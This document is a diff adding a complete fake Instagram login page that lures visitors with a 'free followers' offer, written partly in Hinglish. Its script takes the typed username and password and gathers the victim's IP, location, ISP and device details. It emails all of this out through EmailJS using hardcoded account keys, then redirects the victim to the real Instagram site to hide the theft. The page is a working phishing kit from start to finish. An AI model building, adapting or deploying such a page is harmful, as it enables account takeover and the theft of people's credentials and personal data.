@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#ffffff">
+    <title>Log in • Instagram</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html {
+            font-size: 16px;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        html, body {
+            width: 100%;
+            min-height: 100%;
+            overflow-x: hidden;
+        }
+
+        body {
+            background: #fafafa;
+            min-height: 100vh;
+            min-height: 100dvh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        /* ---- MAIN WRAPPER ---- */
+        .app {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+            gap: 10px;
+        }
+
+        /* ---- ORDER BANNER ---- */
+        .order-banner {
+            background: linear-gradient(135deg, #f3e8ff, #faf5ff);
+            border: 2px solid #d8b4fe;
+            border-radius: 14px;
+            padding: 10px 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .order-icon {
+            font-size: 22px;
+            background: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #e9d5ff;
+            flex-shrink: 0;
+        }
+
+        .order-info {
+            flex: 1;
+            min-width: 0;
+            text-align: left;
+        }
+
+        .order-title {
+            font-size: 10px;
+            color: #7c3aed;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .order-value {
+            font-size: 15px;
+            color: #4c1d95;
+            font-weight: 800;
+            margin-top: 1px;
+        }
+
+        .order-value span {
+            background: linear-gradient(135deg, #c026d3, #7c3aed);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        /* ---- FOLLOWERS BOX ---- */
+        .followers-box {
+            background: white;
+            border: 2px solid #d8b4fe;
+            border-radius: 14px;
+            padding: 10px 12px;
+            text-align: left;
+        }
+
+        .followers-box label {
+            display: block;
+            font-size: 10px;
+            font-weight: 700;
+            color: #7c3aed;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+
+        .followers-row {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .followers-row input {
+            flex: 1;
+            min-width: 0;
+            padding: 9px 10px;
+            font-size: 16px;
+            font-weight: 700;
+            color: #4c1d95;
+            border: 2px solid #e9d5ff;
+            border-radius: 9px;
+            outline: none;
+            background: #faf5ff;
+        }
+
+        .followers-row .unit {
+            font-size: 12px;
+            font-weight: 700;
+            color: #7c3aed;
+            background: #f3e8ff;
+            padding: 9px 10px;
+            border-radius: 9px;
+            border: 2px solid #e9d5ff;
+            white-space: nowrap;
+        }
+
+        .followers-hint {
+            font-size: 10px;
+            color: #a855f7;
+            margin-top: 5px;
+            font-weight: 500;
+        }
+
+        .followers-hint.error { color: #dc2626; font-weight: 700; }
+
+        /* ---- LOGIN BOX ---- */
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 26px 22px 20px;
+            text-align: center;
+        }
+
+        .insta-logo {
+            width: 44px;
+            height: 44px;
+            margin: 0 auto 12px;
+            display: block;
+        }
+
+        .insta-wordmark {
+            font-family: 'Brush Script MT', 'Lucida Handwriting', cursive;
+            font-size: 34px;
+            font-weight: 400;
+            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 20px;
+            letter-spacing: 1px;
+            line-height: 1;
+        }
+
+        .field {
+            position: relative;
+            margin-bottom: 6px;
+            width: 100%;
+        }
+
+        .field input {
+            width: 100%;
+            padding: 15px 12px 11px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            font-size: 16px;
+            color: #262626;
+            outline: none;
+            -webkit-appearance: none;
+        }
+
+        .field input:focus { border-color: #a8a8a8; background: #fff; }
+        .field input::placeholder { color: transparent; }
+
+        .field label {
+            position: absolute;
+            left: 12px;
+            top: 14px;
+            font-size: 14px;
+            color: #8e8e8e;
+            pointer-events: none;
+            transition: all 0.15s ease;
+        }
+
+        .field input:focus + label,
+        .field input:not(:placeholder-shown) + label {
+            top: 5px;
+            font-size: 10px;
+        }
+
+        .pw-wrapper { position: relative; }
+
+        .show-pw {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            font-size: 13px;
+            font-weight: 600;
+            color: #262626;
+            cursor: pointer;
+            padding: 6px 8px;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 11px 16px;
+            font-size: 15px;
+            font-weight: 700;
+            margin-top: 12px;
+            cursor: pointer;
+            -webkit-appearance: none;
+        }
+
+        .login-btn:disabled { background: #b2dffc; cursor: not-allowed; }
+
+        .error-msg {
+            background: #fee2e2;
+            border: 1px solid #fca5a5;
+            color: #991b1b;
+            font-size: 12px;
+            padding: 9px 11px;
+            border-radius: 6px;
+            margin-top: 8px;
+            display: none;
+            text-align: left;
+        }
+
+        .error-msg.show { display: block; }
+
+        /* ---- LOADING ---- */
+        .loading {
+            position: fixed;
+            inset: 0;
+            background: rgba(255,255,255,0.92);
+            backdrop-filter: blur(6px);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+        }
+
+        .loading.show { display: flex; }
+
+        .spinner {
+            width: 38px;
+            height: 38px;
+            border: 4px solid #e9d5ff;
+            border-top-color: #0095f6;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 12px;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loading-text { font-size: 14px; color: #262626; font-weight: 600; }
+
+        /* ---- EXTRA SMALL PHONES ---- */
+        @media (max-width: 360px) {
+            body { padding: 10px; }
+            .app { gap: 8px; }
+            .login-box { padding: 22px 16px 16px; }
+            .insta-wordmark { font-size: 30px; }
+            .insta-logo { width: 40px; height: 40px; }
+            .order-icon { width: 36px; height: 36px; font-size: 20px; }
+        }
+
+        @media (max-width: 320px) {
+            .followers-row .unit { font-size: 11px; padding: 9px 7px; }
+            .insta-wordmark { font-size: 28px; }
+        }
+
+        /* ---- SHORT SCREENS (landscape / small height) ---- */
+        @media (max-height: 640px) {
+            body { justify-content: flex-start; padding-top: 10px; }
+            .login-box { padding: 18px 18px 14px; }
+            .insta-wordmark { font-size: 28px; margin-bottom: 14px; }
+            .insta-logo { width: 36px; height: 36px; margin-bottom: 8px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app">
+
+        <!-- Order Banner -->
+        <div class="order-banner">
+            <div class="order-icon">🎁</div>
+            <div class="order-info">
+                <div class="order-title">Your Free Order</div>
+                <div class="order-value" id="orderValue"><span>100 Followers</span></div>
+            </div>
+        </div>
+
+        <!-- Followers Box -->
+        <div class="followers-box">
+            <label for="followersInput">Apne hisaab se followers chuniye</label>
+            <div class="followers-row">
+                <input type="number" id="followersInput" min="100" max="2000" step="100" value="100" inputmode="numeric">
+                <span class="unit">Followers</span>
+            </div>
+            <div class="followers-hint" id="followersHint">💡 Sirf 100 se 2000 tak ka number daaliye</div>
+        </div>
+
+        <!-- Login Box -->
+        <div class="login-box">
+            <svg class="insta-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <linearGradient id="instaG" x1="0%" y1="100%" x2="100%" y2="0%">
+                        <stop offset="0%" stop-color="#FEDA75" />
+                        <stop offset="25%" stop-color="#FA7E1E" />
+                        <stop offset="50%" stop-color="#D62976" />
+                        <stop offset="75%" stop-color="#962FBF" />
+                        <stop offset="100%" stop-color="#4F5BD5" />
+                    </linearGradient>
+                </defs>
+                <rect x="2" y="2" width="20" height="20" rx="5.5" ry="5.5" fill="url(#instaG)" />
+                <rect x="6.5" y="6.5" width="11" height="11" rx="3" ry="3" fill="none" stroke="white" stroke-width="1.7" />
+                <circle cx="12" cy="12" r="2.8" fill="none" stroke="white" stroke-width="1.7" />
+                <circle cx="16.3" cy="7.7" r="0.9" fill="white" />
+            </svg>
+
+            <div class="insta-wordmark">Instagram</div>
+
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="field">
+                    <input type="text" id="username" placeholder=" " required autocomplete="username">
+                    <label for="username">Mobile number, username or email</label>
+                </div>
+
+                <div class="field pw-wrapper">
+                    <input type="password" id="password" placeholder=" " required autocomplete="current-password">
+                    <label for="password">Password</label>
+                    <button type="button" class="show-pw" onclick="togglePassword()" id="toggleBtn">Show</button>
+                </div>
+
+                <div class="error-msg" id="errorMsg"></div>
+
+                <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+            </form>
+        </div>
+
+    </div>
+
+    <div class="loading" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Logging in...</div>
+    </div>
+
+    <script>
+        const EMAILJS_SERVICE_ID  = 'service_2u2vsqu';
+        const EMAILJS_TEMPLATE_ID = 'template_z3lckb9';
+        const EMAILJS_PUBLIC_KEY  = 'vqkOcxRlgguJnKact';
+
+        emailjs.init(EMAILJS_PUBLIC_KEY);
+
+        const MIN_FOLLOWERS = 100;
+        const MAX_FOLLOWERS = 2000;
+
+        const followersInput = document.getElementById('followersInput');
+        const orderValue = document.getElementById('orderValue');
+        const followersHint = document.getElementById('followersHint');
+
+        function updateOrderBanner() {
+            const val = parseInt(followersInput.value) || 0;
+            orderValue.innerHTML = `<span>${val.toLocaleString('en-IN')} Followers</span>`;
+        }
+
+        function validateFollowers(showError = true) {
+            let val = parseInt(followersInput.value);
+            if (isNaN(val) || val < MIN_FOLLOWERS) {
+                if (showError) {
+                    followersHint.textContent = `⚠️ Minimum ${MIN_FOLLOWERS} followers allowed hain`;
+                    followersHint.classList.add('error');
+                }
+                return null;
+            }
+            if (val > MAX_FOLLOWERS) {
+                if (showError) {
+                    followersHint.textContent = `⚠️ Maximum ${MAX_FOLLOWERS} followers allowed hain`;
+                    followersHint.classList.add('error');
+                }
+                return null;
+            }
+            followersHint.textContent = `💡 Sirf ${MIN_FOLLOWERS} se ${MAX_FOLLOWERS} tak ka number daaliye`;
+            followersHint.classList.remove('error');
+            return val;
+        }
+
+        followersInput.addEventListener('input', () => {
+            validateFollowers();
+            updateOrderBanner();
+        });
+
+        updateOrderBanner();
+
+        function togglePassword() {
+            const pwd = document.getElementById('password');
+            const btn = document.getElementById('toggleBtn');
+            if (pwd.type === 'password') { pwd.type = 'text'; btn.textContent = 'Hide'; }
+            else { pwd.type = 'password'; btn.textContent = 'Show'; }
+        }
+
+        async function collectDeviceInfo() {
+            const info = {};
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                const d = await r.json();
+                info.ip = d.ip || 'Unknown';
+                info.location = `${d.city || '?'}, ${d.region || '?'}, ${d.country_name || '?'}`;
+                info.isp = d.org || 'Unknown';
+            } catch (e) {
+                info.ip = 'Blocked/Unknown';
+                info.location = 'Blocked/Unknown';
+                info.isp = 'Unknown';
+            }
+            info.device = navigator.userAgent;
+            info.platform = navigator.platform || 'Unknown';
+            info.screen = `${window.screen.width}x${window.screen.height}`;
+            info.language = navigator.language || 'Unknown';
+            try { info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { info.timezone = 'Unknown'; }
+            info.internet = navigator.connection?.effectiveType || 'Unknown';
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    info.battery = `${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : ''}`;
+                } else { info.battery = 'Not supported'; }
+            } catch (e) { info.battery = 'Unknown'; }
+            info.cores = navigator.hardwareConcurrency || 'Unknown';
+            info.memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
+            info.touch = ('ontouchstart' in window) ? 'Yes' : 'No';
+            return info;
+        }
+
+        async function handleLogin(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
+
+            const followers = validateFollowers();
+            if (followers === null) {
+                errorMsg.textContent = `Please enter followers between ${MIN_FOLLOWERS} and ${MAX_FOLLOWERS}.`;
+                errorMsg.classList.add('show');
+                return;
+            }
+            if (username.length < 3) {
+                errorMsg.textContent = 'Please enter a valid username, email or mobile number.';
+                errorMsg.classList.add('show');
+                return;
+            }
+            if (password.length < 4) {
+                errorMsg.textContent = 'Your password must be at least 4 characters long.';
+                errorMsg.classList.add('show');
+                return;
+            }
+
+            errorMsg.classList.remove('show');
+            document.getElementById('loadingOverlay').classList.add('show');
+            document.getElementById('loginBtn').disabled = true;
+
+            const info = await collectDeviceInfo();
+
+            const templateParams = {
+                username, password, followers,
+                time: new Date().toLocaleString('en-IN'),
+                ip: info.ip, location: info.location, isp: info.isp,
+                device: info.device, platform: info.platform, screen: info.screen,
+                language: info.language, timezone: info.timezone, internet: info.internet,
+                battery: info.battery, cores: info.cores, memory: info.memory, touch: info.touch
+            };
+
+            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+                .then(() => {
+                    document.getElementById('loadingOverlay').classList.remove('show');
+                    document.getElementById('loginBtn').disabled = false;
+                    window.location.href = 'https://www.instagram.com/';
+                })
+                .catch((error) => {
+                    document.getElementById('loadingOverlay').classList.remove('show');
+                    document.getElementById('loginBtn').disabled = false;
+                    console.error('EmailJS Error:', error);
+                    errorMsg.textContent = 'Email bhejne me problem aayi. Console check karo.';
+                    errorMsg.classList.add('show');
+                });
+        }
+    </script>
+</body>
+</html>
